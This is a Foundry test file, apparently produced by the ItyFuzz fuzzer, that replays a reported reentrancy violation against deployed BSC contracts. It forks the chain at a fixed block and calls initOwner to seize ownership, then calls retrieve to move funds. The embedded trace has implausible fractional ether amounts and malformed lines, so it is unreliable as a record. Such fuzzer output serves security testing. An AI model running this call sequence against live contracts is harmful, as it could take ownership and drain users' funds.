// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c -c bsc --onchain-block-number 23106506 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy vulnerability detected on contract '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c' at storage slot 55743554025734203242333903686915026035351105340035387916644967240542254892840. This could allow draining of funds.
================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.deposit{value: 22828}()
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.initOwner(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024)
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.retrieve(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 224404453924368361433193502520566517205271400644350369098.9180 ether)
   │  ├─[2] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  └─[3] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.receive{value: 1069.8956 ether}()
   ├─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.retrieve(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 5432679989937846758913945972620092949565369064010532021.5020 ether)
   │  ├─[2] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   │  │  ├─[3] Router.swapExactETHForTokens{value: 453.6381 ether}(0, path:(WETH → 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), address(this), block.timestamp);
   │  │  └─[3] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56.receive{value: 1147.3340 ether}()
   └─[1] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.receive999()


 */

contract C0fe2 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 23106506);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).deposit{value: 22828}();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).initOwner(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).retrieve(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 224404453924368361433193502520566517205271400644350369098.9180 ether);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).retrieve(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 5432679989937846758913945972620092949565369064010532021.5020 ether);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 453.6381 ether);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function deposit() external payable;
    function initOwner(address) external payable;
    function retrieve(address,address,uint256) external payable;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
